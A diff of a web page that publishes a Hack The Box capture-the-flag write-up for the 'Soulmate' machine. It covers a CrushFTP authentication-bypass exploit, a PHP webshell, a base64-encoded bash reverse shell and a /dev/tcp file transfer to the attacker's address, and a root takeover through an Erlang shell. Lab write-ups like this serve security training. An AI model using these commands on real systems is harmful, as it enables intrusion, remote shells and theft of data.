@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Soulmate - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Soulmate.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Soulmate machine from HackTheBox - Easy difficulty level">
+    <meta name="description" content="Detailed writeup for Soulmate machine from HackTheBox - Easy difficulty level">
     <meta name="keywords" content="HackTheBox, Soulmate, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,173 @@
         <h1 class="writeup-title">Soulmate</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">Active machine</span>
+            <span class="date">February 14, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Soulmate" src="../images/Soulmate/pwned.png" /></p>
-<p>Soulmate is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Soulmate retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Soulmate/pwned.png" /></p>
+<p>Soulmate was an easy-difficulty Linux machine that began with an nmap scan revealing SSH on port 22 and HTTP on port 80. The web application was a PHP-based dating website where I registered an account (test:testtest) and explored functionality including profile picture uploads, which proved to be a dead end after attempting file upload bypasses.
+With no viable XSS or file upload vectors, I performed subdomain fuzzing using ffuf and discovered an FTP subdomain (ftp.soulmate.htb), which I added to my hosts file.
+The FTP subdomain hosted a CrushFTP instance that required authentication. I researched unauthenticated vulnerabilities affecting CrushFTP and identified CVE-2025-2825, a critical authentication bypass vulnerability exploiting a race condition in the AWS4-HMAC authorization method.
+Using a public PoC script (ShatteredFTP), I sent a specially-crafted XML payload that bypassed authentication and created a new user account (test:test) with administrative privileges, granting me access to the CrushFTP web interface.</p>
+<p>After authenticating to CrushFTP, I explored the admin panel and discovered the User Manager functionality. I identified two legitimate users: Ben and Jenna.
+Ben's user directory contained a "User's stuff" folder pointing to the Soulmate website source code directory (webProd). I reset Ben's password to Password123 via the User Manager, logged in as Ben, navigated to the webProd directory, and uploaded a minimal PHP webshell (<?=<code>$_GET[0]</code>?>) to shell.php.
+I confirmed remote code execution by browsing to http://soulmate.htb/shell.php?0=id, then executed a base64-encoded bash reverse shell payload to obtain an initial foothold as the www-data user.</p>
+<p>During post-exploitation enumeration, I explored the web application's data directory and extracted the SQLite database (soulmate.db), which contained only a bcrypt-hashed admin password that I deemed too expensive to crack.
+I searched for readable directories and filtered results for interesting filenames using grep with patterns like config, password, credentials, and ssh. This revealed several files related to Erlang, a high-level programming language.
+In /usr/local/lib/erlang_login, I found start.escript, which contained hardcoded credentials for Ben (HouseH0ldings998) and configured an SSH daemon on port 2222 using Erlang's SSH library.
+I used these credentials to SSH into the machine as Ben and captured the user flag.</p>
+<p>For privilege escalation, I verified that Ben had no sudo privileges and confirmed that a service was listening on port 2222 using netstat.
+I connected to this non-standard SSH port from my existing shell and was dropped into an eshell (Erlang shell) instead of a traditional bash shell.
+I explored the eshell help documentation and discovered file system functions, confirming that I could list any directory on the system, including root's home directory, despite being a low-privileged user. I researched how to write files in Erlang and found file:write_file/2 on StackOverflow.
+I generated an SSH keypair on my attack box using ssh-keygen, then used the eshell to write my public key to root's authorized_keys file with the command file:write_file("/root/.ssh/authorized_keys", "PUBKEY").
+After setting proper permissions (chmod 600) on my private key, I successfully authenticated to the machine as root via SSH using the keypair and captured the root flag.</p>
+<h1>User Flag</h1>
+<p><img alt="nmap" src="../images/Soulmate/nmap.png" /></p>
+<p>Initial nmap scan reveals 2 open ports. SSH on 22 and HTTP on 80.</p>
+<h2>Investigating the website</h2>
+<p><img alt="website" src="../images/Soulmate/website.png" /></p>
+<p>This is some sort of dating website made with PHP. I'll create an account with my usual credentials of <code>test:testtest</code></p>
+<p><img alt="edit" src="../images/Soulmate/edit.png" /></p>
+<p>Right away, I noticed that I can upload a profile picture. I tried to upload a PHP file instead, together with manipulating the magic bytes and the content-type header, but I did not manage to bypass the safeguards, and deemed this a dead end.</p>
+<p>There is also no way to make posts or stories, so XSS would also be a dead end if the bio field were vulnerable to it.</p>
+<p>Having said all that, I will fuzz for subdomains and endpoints.</p>
+<p><img alt="fuzz" src="../images/Soulmate/fuzz.png" /></p>
+<p>Aside from the few insignificant PHP endpoints, an FTP subdomain was found. I'll add this subdomain to my host file.</p>
+<h2>CrushFTP exploitation</h2>
+<p><img alt="ftp" src="../images/Soulmate/ftp.png" /></p>
+<p>This is a CrushFTP instance. It requires credentials, which I don't have at this point. Credentials to my Soulmate account do not work either, which was expected.</p>
+<p>I will look for unauthenticated/auth bypass CVEs affecting CrushFTP. I do not know which version exactly it is running, so anything interesting I'll find will require some testing to determine whether this instance is vulnerable.</p>
+<p>A quick search brought me to <code>CVE-2025-31161</code>, and a rejected, similar <code>CVE-2025-2825</code></p>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31161">https://nvd.nist.gov/vuln/detail/CVE-2025-31161</a></p>
+<p><a href="https://www.sonicwall.com/blog/critical-crushftp-authentication-bypass-cve-2025-2825-exposes-servers-to-remote-attacks">https://www.sonicwall.com/blog/critical-crushftp-authentication-bypass-cve-2025-2825-exposes-servers-to-remote-attacks</a></p>
+<p>These CVEs resolve around a race condition in the AWS4-HMAC  authorization method of the HTTP component of the FTP server. By sending a specially prepared XML payload, an attacker can bypass the authentication and "log in" as any guessable user on the server, like the <code>crushadmin</code></p>
+<p>While at it, I also found a PoC script for those two CVEs.</p>
+<p><a href="https://github.com/ghostsec420/ShatteredFTP/tree/main">https://github.com/ghostsec420/ShatteredFTP/tree/main</a></p>
+<p>I'll create a new user with the credentials of <code>test:test</code> using this exploit.</p>
+<p><code>python ShatteredFTP/Shattered.py --target_host ftp.soulmate.htb --port 80 --new_user test --password test --cve 2825</code></p>
+<p><img alt="exploit" src="../images/Soulmate/exploit.png" /></p>
+<p>Exploit successful! I'll try logging into the CrushFTP instance with these new credentials.</p>
+<p><img alt="crushftp" src="../images/Soulmate/crushftp.png" /></p>
+<h2>Exploring the CrushFTP web interface</h2>
+<p>Of course, this user will have no files in their bucket. Adding files will not be of much use either. Since I have access to the admin panel, I will take a look at it, as this should have more powerful functionalities.</p>
+<p><img alt="dashboard" src="../images/Soulmate/dashboard.png" /></p>
+<p>In the dashboard, I can see a few powerful sections, such as jobs or the user manager. Jobs require an enterprise subscription, which this instance does not have.</p>
+<p><img alt="usermanager" src="../images/Soulmate/usermanager.png" /></p>
+<p>Looking at the users, I can see 2 interesting ones, Ben and Jenna. Ben's "Users' stuff" dir contains the Soulmate website source code. If I can get my hands on that, I'll be able to add a webshell to the website, which is a sure way for code execution. This will be my next step.</p>
+<h2>Code execution via webshell injection</h2>
+<p>Using the user manager functionality, I reset Ben's password to <code>Password123</code> and saved the result. After logging out of my test account, I will log in as Ben with <code>ben:Password123</code></p>
+<p><img alt="ben" src="../images/Soulmate/ben.png" /></p>
+<p>After going to the <code>webProd</code> directory, there is an option to add files right here. I'll create a simple PHP webshell for code execution.</p>
+<p><img alt="webprod" src="../images/Soulmate/webprod.png" /></p>
+<p><code>&lt;?=</code>$_GET[0]<code>?&gt;</code></p>
+<p><img alt="upld" src="../images/Soulmate/upl.png" /></p>
+<p>After successfully uploading the file, I'll navigate to <code>http://soulmate.htb/shell.php?0=id</code> to execute the <code>id</code> command on the server.</p>
+<p><img alt="id" src="../images/Soulmate/id.png" /></p>
+<p>Code execution confirmed. Now I'll prepare a command that will send back a shell to my listener.</p>
+<p><code>echo YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuODYvOTAwMSAwPiYxJw== | base64 -d |bash</code></p>
+<p>This needs to be URL-encoded because I'll be sending it via an HTTP request.</p>
+<p><code>echo+YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuODYvOTAwMSAwPiYxJw%3d%3d+|+base64+-d+|bash</code></p>
+<p><img alt="shell" src="../images/Soulmate/shell.png" /></p>
+<h2>Exploring the landing directories</h2>
+<p><img alt="config" src="../images/Soulmate/config.png" /></p>
+<p>Light reconnaissance reveals that the db is stored under <code>~/soulmate.htb/data/soulmate.db</code>. I can send it over to my host easily with just two commands.</p>
+<pre class="codehilite"><code>cat soulmate.db &gt; /dev/tcp/10.10.16.86/9001 | On the victim box
+
+nc -lnkvp 9001 &gt; soulmate.db | On the attack box
+</code></pre>
+
+<p><img alt="database" src="../images/Soulmate/database.png" /></p>
+<p>This DB only contains a hashed password for the admin. This is a bcrypt hash as well, so I won't try cracking it for now.</p>
+<p>I will look for directories readable by my user. However, since there is quite a lot of data, I will use grep with the -E flag to filter for interesting filenames.</p>
+<pre class="codehilite"><code>find / -xdev -type d -readable 2&gt;/dev/null &gt; readabledirs
+
+cat readabledirs | grep -E 'config|login|password|credential|credentials|script|ssh
+</code></pre>
+
+<p><img alt="erlang" src="../images/Soulmate/erlang.png" /></p>
+<p>There are quite a few files related to <code>erlang</code>. This is a high-level language, of which I was not aware. In the <code>usr/local/lib/erlang_login</code> dir, there are 2 .escript files. One of them contains credentials for Ben.</p>
+<pre class="codehilite"><code># start.escript
+
+#!/usr/bin/env escript
+%%! -sname ssh_runner
+
+main(_) -&gt;
+    application:start(asn1),
+    application:start(crypto),
+    application:start(public_key),
+    application:start(ssh),
+
+    io:format(&quot;Starting SSH daemon with logging...~n&quot;),
+
+    case ssh:daemon(2222, [
+        {ip, {127,0,0,1}},
+        {system_dir, &quot;/etc/ssh&quot;},
+
+        {user_dir_fun, fun(User) -&gt;
+            Dir = filename:join(&quot;/home&quot;, User),
+            io:format(&quot;Resolving user_dir for ~p: ~s/.ssh~n&quot;, [User, Dir]),
+            filename:join(Dir, &quot;.ssh&quot;)
+        end},
+
+        {connectfun, fun(User, PeerAddr, Method) -&gt;
+            io:format(&quot;Auth success for user: ~p from ~p via ~p~n&quot;,
+                      [User, PeerAddr, Method]),
+            true
+        end},
+
+        {failfun, fun(User, PeerAddr, Reason) -&gt;
+            io:format(&quot;Auth failed for user: ~p from ~p, reason: ~p~n&quot;,
+                      [User, PeerAddr, Reason]),
+            true
+        end},
+
+        {auth_methods, &quot;publickey,password&quot;},
+
+        {user_passwords, [{&quot;ben&quot;, &quot;HouseH0ldings998&quot;}]},
+        {idle_time, infinity},
+        {max_channels, 10},
+        {max_sessions, 10},
+        {parallel_login, true}
+    ]) of
+        {ok, _Pid} -&gt;
+            io:format(&quot;SSH daemon running on port 2222. Press Ctrl+C to exit.~n&quot;);
+        {error, Reason} -&gt;
+            io:format(&quot;Failed to start SSH daemon: ~p~n&quot;, [Reason])
+    end,
+
+    receive
+        stop -&gt; ok
+    end.
+</code></pre>
+
+<p>It seems like Erlang is being used together with SSH runner. This might be important in the future, but for now, I will note down these credentials.</p>
+<p><code>ben | HouseH0ldings998</code></p>
+<p>I will try these credentials to log into the machine as Ben.</p>
+<p><img alt="user" src="../images/Soulmate/user.png" /></p>
+<h1>Root Flag</h1>
+<p><img alt="sudol" src="../images/Soulmate/sudol.png" /></p>
+<p>Ben cannot run anything as root on the box. The .escript file contained references to an SSH service running on port 2222, and looking at listening services confirms that there is indeed something listening.</p>
+<p><img alt="ports" src="../images/Soulmate/ports.png" /></p>
+<h2>Exploiting the Erlang SSH shell</h2>
+<p>This is a popular second choice for an SSH port aside from the standard <code>22</code>. I'll try to SSH into that from my current Ben shell.</p>
+<p><img alt="eshell" src="../images/Soulmate/eshell.png" /></p>
+<p>This drops me into an <code>eshell</code>. After making myself familiar with the help section, I quickly found a way to list directories, and found out that I can see any listing I want, even if it belongs to root.</p>
+<p><img alt="rootdir" src="../images/Soulmate/rootdir.png" /></p>
+<p>While I can see the contents, I did not find a way to write/read files easily in this help menu. Luckily, I found an answer on Stack Overflow rather quickly.</p>
+<p><a href="https://stackoverflow.com/questions/5224564/erlang-how-to-write-my-outputs-in-a-text-file">https://stackoverflow.com/questions/5224564/erlang-how-to-write-my-outputs-in-a-text-file</a></p>
+<p>By running <code>file:write_file("PATH", "DATA").</code> in the eshell, I should be able to write an SSH key into root's authorized keys file. Unless I don't have write perms, but this is quick enough to check that I'll go through with it regardless.</p>
+<pre class="codehilite"><code>ssh-keygen | Creates a keypair
+
+file:write_file(&quot;/root/.ssh/authorized_keys&quot;, &quot;PUBKEY&quot;). | Writes the public key into the specified location. Make sure the private key's permissions are set to 600, otherwise it will not authenticate.
+</code></pre>
+
+<p><img alt="write" src="../images/Soulmate/write.png" /></p>
+<p>On my machine, I will try to SSH into the box as root using this keypair.</p>
+<p><img alt="root" src="../images/Soulmate/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
@@ -87,7 +244,7 @@
     
     <footer>
         <div class="container">
-            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
         </div>
     </footer>
 
